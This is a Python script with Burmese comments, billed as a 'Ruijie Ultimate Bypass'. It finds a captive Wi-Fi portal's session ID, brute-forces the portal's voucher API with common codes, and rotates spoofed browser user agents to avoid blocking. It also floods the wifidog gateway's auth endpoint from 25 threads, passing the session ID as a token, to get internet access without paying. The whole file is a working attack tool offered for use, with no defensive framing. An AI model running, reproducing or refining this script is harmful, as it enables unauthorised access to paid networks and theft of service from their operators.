#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import random
from urllib.parse import urlparse, parse_qs

# SSL Warning များကို ပိတ်ထားခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# PRO ENGINE CONFIGURATION
# ===============================
# လိုင်းငြိမ်ရန်နှင့် မြန်ဆန်ရန် သတ်မှတ်ချက်များ
PING_THREADS = 25
MIN_INTERVAL = 0.02
MAX_INTERVAL = 0.1

# Brute Force အတွက် အသုံးများသော Voucher များ
VOUCHER_DATABASE = [
    '123456', '888888', '111111', '000000', '999999', 
    '666666', '12345678', '87654321', '0000', '1111'
]

# စက်ပစ္စည်းအစစ်ကဲ့သို့ ထင်ယောင်ထင်မှားဖြစ်စေရန် (Anti-Block)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

# Colors
RED, GREEN, CYAN, YELLOW, MAGENTA, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[95m", "\033[0m"

stop_event = threading.Event()

# ===============================
# CORE LOGIC FUNCTIONS
# ===============================

def check_internet():
    """ အင်တာနက် အမှန်တကယ် ရမရ Multi-Check ဖြင့် စစ်ဆေးခြင်း """
    urls = ["http://www.google.com", "http://1.1.1.1", "http://neverssl.com"]
    try:
        for url in urls:
            try:
                if requests.get(url, timeout=2).status_code == 200:
                    return True
            except: continue
        return False
    except:
        return False

def brute_force_attack(portal_host, sid):
    """ Voucher API ကို နောက်ကွယ်မှ အလိုအလျောက် Brute Force လုပ်ခြင်း """
    session = requests.Session()
    voucher_api = f"{portal_host}/api/auth/voucher/"
    
    for code in VOUCHER_DATABASE:
        if stop_event.is_set(): break
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
            session.post(voucher_api, json=payload, headers=headers, timeout=3)
            print(f"{YELLOW}[!] Brute Force Testing: {code}{RESET}", end="\r")
            time.sleep(0.1)
        except:
            continue

def turbo_pulse(auth_link, sid):
    """ လိုင်းမပြတ်စေရန် Connection Pooling ဖြင့် အဆက်မပြတ် Pulse ပေးပို့ခြင်း """
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
    session.mount('http://', adapter)
    
    while not stop_event.is_set():
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        try:
            response = session.get(auth_link, headers=headers, timeout=3)
            if response.status_code == 200:
                print(f"{GREEN}[⚡] STABLE PULSE & BRUTE ACTIVE | SID: {sid[:6]}{RESET}", end="\r")
            else:
                print(f"{YELLOW}[!] Signal Weak... Reconnecting{RESET}", end="\r")
        except:
            time.sleep(0.5)
            continue
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_engine():
    """ Stability နှင့် Brute Force ပေါင်းစပ်ထားသော Ultimate Bypass Engine """
    print(f"{CYAN}--- Ruijie Ultimate Bypass (Pro + Brute Force) ---{RESET}")
    print(f"{CYAN}--- Status: Max Stability & High Speed (No Key) ---{RESET}\n")
    
    while not stop_event.is_set():
        if check_internet():
            print(f"{YELLOW}[•] Connection Stable. Monitoring...{RESET}", end="\r")
            time.sleep(5)
            continue

        try:
            # Portal ကို အမြန်ဆုံး ဖမ်းယူခြင်း
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            portal_url = r.url
            parsed = urlparse(portal_url)
            portal_host = f"{parsed.scheme}://{parsed.netloc}"
            
            sid = parse_qs(parsed.query).get('sessionId', [None])[0]
            if not sid:
                html = requests.get(portal_url).text
                match = re.search(r'sessionId=([a-zA-Z0-9]+)', html)
                sid = match.group(1) if match else None

            if sid:
                print(f"\n{GREEN}[✓] Target Locked: {sid}{RESET}")
                
                # ၁။ Brute Force စတင်ခြင်း
                print(f"{MAGENTA}[*] Initiating Brute Force Sequence...{RESET}")
                threading.Thread(target=brute_force_attack, args=(portal_host, sid), daemon=True).start()
                
                # ၂။ Gateway အချက်အလက်များယူခြင်း
                params = parse_qs(parsed.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

                # ၃။ Stable Pulse Threads များ စတင်ခြင်း
                print(f"{MAGENTA}[*] Launching {PING_THREADS} Stable Pulse Threads...{RESET}")
                for _ in range(PING_THREADS):
                    threading.Thread(target=turbo_pulse, args=(auth_link, sid), daemon=True).start()
                
                # အင်တာနက် အခြေအနေကို စောင့်ကြည့်ပြီး ပြတ်သွားပါက Auto-Reconnect လုပ်ခြင်း
                while True:
                    if not check_internet():
                        print(f"\n{RED}[!] Internet Lost! Retrying Bypass...{RESET}")
                        break
                    time.sleep(5)
        except:
            time.sleep(2)

if __name__ == "__main__":
    try:
        start_engine()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}Engine Halted by User.{RESET}")
            
